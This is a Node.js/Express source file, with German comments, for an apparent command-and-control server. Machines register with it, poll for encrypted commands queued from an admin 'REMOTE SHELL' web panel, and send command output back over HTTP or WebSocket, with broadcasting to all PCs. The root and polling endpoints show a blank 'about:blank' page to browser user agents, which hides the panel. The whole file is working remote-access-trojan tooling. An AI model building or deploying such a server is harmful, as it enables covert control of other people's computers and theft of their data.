const express = require('express');
const session = require('express-session');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const WebSocket = require('ws');
const app = express();
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });
const PORT = process.env.PORT || 3000;

app.set('trust proxy', 1);
app.use((req, res, next) => {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    next();
});

const ADMIN_PASSWORT = process.env.ADMIN_PASSWORD || "Achtung_Du_Musst_Ein_Passwort_Bei_Render_Eintragen_123456789";
const AES_KEY = crypto.randomBytes(32);
const ALGORITHM = 'aes-256-cbc';

const registeredTokens = {};
const pcCommands = {};
const pcSockets = {};

function generateToken() { return crypto.randomBytes(24).toString('hex'); }

function encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(ALGORITHM, AES_KEY, iv);
    let e = cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
    return iv.toString('hex') + ':' + e;
}

function decrypt(text) {
    const parts = text.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const decipher = crypto.createDecipheriv(ALGORITHM, AES_KEY, iv);
    return decipher.update(parts[1], 'hex', 'utf8') + decipher.final('utf8');
}

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
    secret: process.env.SESSION_SECRET || 'session-secret-muss-geaendert-werden',
    resave: false, saveUninitialized: false,
    cookie: { maxAge: 30 * 60 * 1000 }
}));

const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5,
    message: '<h1>Zu viele Fehlversuche!</h1><p>Bitte warte 15 Minuten.</p>' });

// ==================== REGISTRIERUNG ====================
app.post('/register', (req, res) => {
    const { pcId } = req.body;
    if (!pcId) return res.status(400).json({ error: 'pcId erforderlich' });
    if (!registeredTokens[pcId]) {
        registeredTokens[pcId] = { token: generateToken(), lastSeen: Date.now(), online: false };
    }
    registeredTokens[pcId].online = true;
    registeredTokens[pcId].lastSeen = Date.now();
    res.json({ token: registeredTokens[pcId].token });
});

// ==================== HEADLESS (fuer alte Clients) ====================
app.get('/headless', (req, res) => {
    const ua = req.headers['user-agent'] || '';
    if (/Mozilla|Chrome|Safari|Firefox|Edge|Brave/i.test(ua)) {
        return res.send('<!DOCTYPE html><html><head><title>about:blank</title></head><body></body></html>');
    }
    const token = req.headers['x-pc-token'];
    const pcId = req.headers['x-pc-id'];
    if (!token || !pcId) return res.status(401).send('Unauthorized');
    if (!registeredTokens[pcId]) {
        registeredTokens[pcId] = { token, lastSeen: Date.now(), online: true };
    }
    registeredTokens[pcId].token = token;
    registeredTokens[pcId].online = true;
    registeredTokens[pcId].lastSeen = Date.now();
    const command = pcCommands[pcId];
    if (command) {
        try {
            res.send(decrypt(command));
            delete pcCommands[pcId];
        } catch { res.send('KEIN_BEFEHL'); }
    } else { res.send('KEIN_BEFEHL'); }
});

app.post('/output', (req, res) => {
    const token = req.headers['x-pc-token'];
    const pcId = req.headers['x-pc-id'];
    if (!token || !pcId || !registeredTokens[pcId] || registeredTokens[pcId].token !== token) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    try {
        const output = Buffer.from(req.body.output, 'base64').toString('utf8');
        if (!app.outputs) app.outputs = {};
        if (!app.outputs[pcId]) app.outputs[pcId] = [];
        app.outputs[pcId].push({ timestamp: new Date().toISOString(), output });
        res.json({ status: 'received' });
    } catch { res.status(500).json({ error: 'Base64 Fehler' }); }
});

// ==================== BEFEHL SENDEN ====================
app.post('/command', (req, res) => {
    if (!req.session.eingeloggt) return res.status(403).send('Zugriff verweigert!');
    const { target, command } = req.body;
    if (!command) return res.status(400).send('Befehl erforderlich');
    const encrypted = encrypt(command);
    if (target === 'all') {
        for (const id in registeredTokens) pcCommands[id] = encrypted;
    } else if (registeredTokens[target]) {
        pcCommands[target] = encrypted;
    }
    res.json({ status: 'Gesendet' });
});

app.get('/pcs', (req, res) => {
    if (!req.session.eingeloggt) return res.status(403).send('Zugriff verweigert!');
    res.json(Object.entries(registeredTokens).map(([id, d]) => ({
        id, online: d.online, lastSeen: new Date(d.lastSeen).toLocaleString('de-DE'),
        hasOutput: app.outputs && app.outputs[id] ? app.outputs[id].length : 0,
        hasWebSocket: !!pcSockets[id]
    })));
});

app.get('/outputs/:pcId', (req, res) => {
    if (!req.session.eingeloggt) return res.status(403).send('Zugriff verweigert!');
    res.json((app.outputs && app.outputs[req.params.pcId]) || []);
});

// ==================== ADMIN ====================
app.get('/', (req, res) => res.send('<!DOCTYPE html><html><head><title>about:blank</title></head><body></body></html>'));

app.get('/admin', (req, res) => {
    if (req.session.eingeloggt) return res.redirect('/admin/dashboard');
    res.send('<h1>Admin Login</h1><form action="/admin/login" method="POST"><input type="password" name="password" placeholder="Passwort" required><br><br><button type="submit">Einloggen</button></form>');
});

app.post('/admin/login', loginLimiter, (req, res) => {
    if (req.body.password === ADMIN_PASSWORT) { req.session.eingeloggt = true; res.redirect('/admin/dashboard'); }
    else res.send('<h1>Falsches Passwort!</h1><a href="/admin">Nochmal versuchen</a>');
});

app.get('/admin/dashboard', (req, res) => {
    if (!req.session.eingeloggt) return res.redirect('/admin');
    res.send(`
<!DOCTYPE html>
<html>
<head>
<title>Remote Shell</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Courier New', monospace; background: #0c0c0c; color: #cccccc; height: 100vh; display: flex; flex-direction: column; }
#topbar { background: #1a1a1a; padding: 8px 15px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #333; }
#topbar select { background: #2d2d2d; color: #fff; border: 1px solid #555; padding: 5px 10px; border-radius: 3px; font-family: monospace; }
#topbar .status { font-size: 12px; }
.online { color: #00ff88; }
.offline { color: #ff4444; }
#terminal { flex: 1; overflow-y: auto; padding: 10px; font-size: 14px; line-height: 1.5; }
#terminal .prompt { color: #00d4ff; }
#terminal .cmd { color: #ffffff; }
#terminal .output { color: #cccccc; white-space: pre-wrap; }
#terminal .error { color: #ff6b6b; white-space: pre-wrap; }
#inputLine { display: flex; padding: 8px 15px; background: #1a1a1a; border-top: 1px solid #333; }
#inputLine span { color: #00d4ff; margin-right: 8px; }
#cmdInput { flex: 1; background: transparent; border: none; color: #fff; font-family: 'Courier New', monospace; font-size: 14px; outline: none; }
a { color: #00d4ff; text-decoration: none; }
</style>
</head>
<body>
<div id="topbar">
    <strong style="color:#00d4ff;">REMOTE SHELL</strong>
    <select id="target"><option value="all">ALLE PCs</option></select>
    <span class="status" id="status"></span>
    <a href="/admin/logout" style="margin-left:auto;">Logout</a>
</div>
<div id="terminal"></div>
<div id="inputLine">
    <span id="promptText">PS &gt;</span>
    <input type="text" id="cmdInput" autofocus autocomplete="off" spellcheck="false">
</div>
<script>
const terminal = document.getElementById('terminal');
const cmdInput = document.getElementById('cmdInput');
const target = document.getElementById('target');
const promptText = document.getElementById('promptText');
const status = document.getElementById('status');
let history = [];
let historyIdx = -1;

async function loadPCs() {
    const pcs = await (await fetch('/pcs')).json();
    const cur = target.value;
    target.innerHTML = '<option value="all">ALLE PCs</option>';
    pcs.forEach(p => {
        const o = document.createElement('option');
        o.value = p.id;
        o.textContent = p.id + (p.online ? ' [WS]' : ' [HTTP]');
        target.appendChild(o);
    });
    try { target.value = pcs.find(p => p.id === cur)?.id || 'all'; } catch(e) {}
    const count = pcs.filter(p => p.online).length;
    status.textContent = count + ' online';
    status.className = count > 0 ? 'status online' : 'status offline';
}
loadPCs();
setInterval(loadPCs, 10000);

function addLine(type, text) {
    const div = document.createElement('div');
    div.className = type;
    div.textContent = text;
    terminal.appendChild(div);
    terminal.scrollTop = terminal.scrollHeight;
}

cmdInput.addEventListener('keydown', async (e) => {
    if (e.key === 'Enter') {
        const cmd = cmdInput.value.trim();
        if (!cmd) return;
        history.push(cmd);
        historyIdx = history.length;
        addLine('prompt', promptText.textContent + ' ' + cmd);
        cmdInput.value = '';
        const t = target.value;
        try {
            await fetch('/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ target: t, command: cmd })
            });
        } catch(err) {}
    } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (historyIdx > 0) { historyIdx--; cmdInput.value = history[historyIdx]; }
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (historyIdx < history.length - 1) { historyIdx++; cmdInput.value = history[historyIdx]; }
        else { historyIdx = history.length; cmdInput.value = ''; }
    }
});

// WebSocket fur live Output
const ws = new WebSocket('wss://' + location.host + '/ws-terminal');
ws.onopen = () => { console.log('WS Terminal connected'); };
ws.onmessage = (msg) => {
    const data = JSON.parse(msg.data);
    if (data.type === 'output') {
        addLine('output', '[' + data.pcId + ']' + data.output);
    } else if (data.type === 'error') {
        addLine('error', '[' + data.pcId + ']' + data.output);
    }
};
ws.onclose = () => { console.log('WS Terminal disconnected'); };

document.addEventListener('click', () => cmdInput.focus());
</script>
</body>
</html>`);
});

app.get('/admin/logout', (req, res) => { req.session.destroy(); res.redirect('/admin'); });

// ==================== WEBSOCKET SERVER ====================
wss.on('connection', (ws, req) => {
    const url = new URL(req.url, 'http://' + req.host);
    
    // Admin Terminal WebSocket
    if (url.pathname === '/ws-terminal') {
        if (!req.session || !req.session.eingeloggt) { ws.close(); return; }
        ws.isAdmin = true;
        console.log('[WS] Admin Terminal verbunden');
        return;
    }

    // PC Client WebSocket
    const pcId = url.searchParams.get('pcId');
    const token = url.searchParams.get('token');

    if (!pcId || !token) { ws.close(); return; }

    // Auto-Registrierung
    if (!registeredTokens[pcId]) {
        registeredTokens[pcId] = { token, lastSeen: Date.now(), online: true };
    }
    registeredTokens[pcId].token = token;
    registeredTokens[pcId].online = true;
    pcSockets[pcId] = ws;

    console.log(`[WS] PC "${pcId}" verbunden`);

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data.toString());
            registeredTokens[pcId].lastSeen = Date.now();

            if (msg.type === 'output') {
                // An Admin Terminal weiterleiten
                const outputLine = JSON.stringify({ type: msg.isError ? 'error' : 'output', pcId, output: msg.data });
                wss.clients.forEach(c => { if (c.isAdmin && c.readyState === 1) c.send(outputLine); });
                
                // Auch speichern
                if (!app.outputs) app.outputs = {};
                if (!app.outputs[pcId]) app.outputs[pcId] = [];
                app.outputs[pcId].push({ timestamp: new Date().toISOString(), output: msg.data });
            } else if (msg.type === 'heartbeat') {
                registeredTokens[pcId].online = true;
                registeredTokens[pcId].lastSeen = Date.now();
            }
        } catch {}
    });

    ws.on('close', () => {
        console.log(`[WS] PC "${pcId}" getrennt`);
        if (registeredTokens[pcId]) registeredTokens[pcId].online = false;
        delete pcSockets[pcId];
    });
});

server.listen(PORT, () => {
    console.log('Server lauft auf Port ' + PORT);
    console.log('WebSocket AKTIV');
    console.log('Admin: /admin');
});
